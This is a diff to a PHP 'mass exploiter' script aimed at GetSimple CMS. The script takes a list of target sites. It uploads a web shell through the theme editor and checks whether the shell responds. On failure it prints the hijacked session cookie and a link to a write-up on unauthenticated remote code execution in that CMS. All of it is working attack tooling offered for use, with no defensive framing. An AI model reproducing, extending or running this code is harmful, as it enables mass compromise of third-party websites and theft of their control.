@@ -1,7 +1,7 @@
 <?php
 /**
 * @author Con7ext <kreonrinto@gmail.com>
-* GetSimpleCMS Mass Exploiter
+* GetCMS Mass Exploiter
 * php file.php list.txt
 **/
 class getCMS{
@@ -120,7 +120,15 @@ class getCMS{
       "nonce" => $n);
     $req = $this->makeRequest($this->url."/admin/theme-edit.php", $data, $this->headers);
     if(!preg_match("|CSRF detected|", $req["body"])){
-      echo "\033[0;32mSuccess -> ".$this->url."/theme/".$this->shell."\n";
+      echo "\033[0;32mSuccess Upload Shell\n";
+      echo "\033[0;34m[+]Checking Shell...\n";
+      $muk = $this->makeRequest($this->url."/theme/".$this->shell);
+      if($muk["head"] == 200){
+        echo "\033[0;32mFound -> ".$this->url."/theme/".$this->shell."\n";
+      }
+      else{
+        echo "\033[0;31mNot Found \033[0;34m[!] Try Manual this Cookie: ".$this->cookie." \033[1;37mhttps://plantsec.blogspot.com/2019/06/getsimple-cms-unauthenticated-remote.html\n";
+      }
     }
     else{
       echo "\033[0;31mFailed\n";
